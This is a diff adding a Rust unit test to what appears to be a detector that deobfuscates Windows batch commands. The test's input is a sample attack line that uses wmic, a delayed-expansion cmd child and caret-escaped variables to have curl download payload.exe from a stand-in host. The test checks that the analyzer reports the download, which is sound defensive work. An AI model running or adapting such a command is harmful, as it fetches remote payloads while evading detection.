@@ -27257,6 +27257,24 @@ wmic process call create "%COMSPEC% /V:ON /c set U=https://wmic-escaped.example/
     }
 
     #[test]
+    fn wmic_process_call_create_comspec_v_on_preserves_escaped_delayed_child() {
+        let script = br#"wmic process call create "%COMSPEC% /V:ON /c set U=https://wmic-von-escaped.example/payload.exe&&curl -o payload.exe ^!U^!""#;
+        let report = analyze(script, &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://wmic-von-escaped.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "wmic COMSPEC /V:ON child did not preserve escaped delayed expansion: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn wmic_process_call_create_tolerates_spacing_and_case() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
